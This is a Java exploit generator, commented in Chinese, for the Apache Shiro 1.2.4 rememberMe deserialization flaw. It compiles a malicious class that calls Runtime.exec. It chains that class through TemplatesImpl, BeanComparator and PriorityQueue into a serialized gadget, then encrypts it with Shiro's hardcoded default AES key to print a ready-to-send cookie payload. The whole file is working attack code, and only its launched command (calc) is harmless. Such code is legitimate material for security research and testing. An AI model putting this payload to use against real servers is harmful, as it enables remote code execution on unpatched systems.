/**依赖部分**/
     <dependency>
     <groupId>org.javassist</groupId>
     <artifactId>javassist</artifactId>
     <version>3.21.0-GA</version>
     </dependency>





/**代码部分**/
package org.apache.shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;


public class CommonsBeanutilsShiro {
    // 反射修改field，统一写成函数，方便阅读代码
    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }

    // 获取攻击链序列化后的byte数组
    public static byte[] getPayload() throws Exception {
        // 创建恶意类，用于报错抛出调用链
        ClassPool pool = ClassPool.getDefault();
        CtClass payload = pool.makeClass("EvilClass");
        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        // 看shiro调用链用这个
        // payload.makeClassInitializer().setBody("new java.io.IOException().printStackTrace();");
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] evilClass = payload.toBytecode();

        // set field
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{evilClass});
        setFieldValue(templates, "_name", "test");
        setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

        // 创建序列化对象
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);  // **修改点1**
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add("1");  // **修改点2**
        queue.add("1");

        // 修改值
        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        // 反序列化
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(byteArrayOutputStream);
        out.writeObject(queue);
        out.close();
        return byteArrayOutputStream.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        byte[] payloads = CommonsBeanutilsShiro.getPayload();

        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        // 为shiro 1.2.4默认密钥，详情见AbstractRememberMeManager类的DEFAULT_CIPHER_KEY_BYTES属性
        ByteSource ciphertext = aes.encrypt(payloads, key);
        // 由于继承关系，encrypt实际调用的是JcaCipherService#encrypt
        // 跟进代码后发现实际返回的是ByteSource接口的实现类——SimpleByteSource类，其toString方法会自动对byte数组进行base64编码
        System.out.printf(ciphertext.toString());
    }
}     
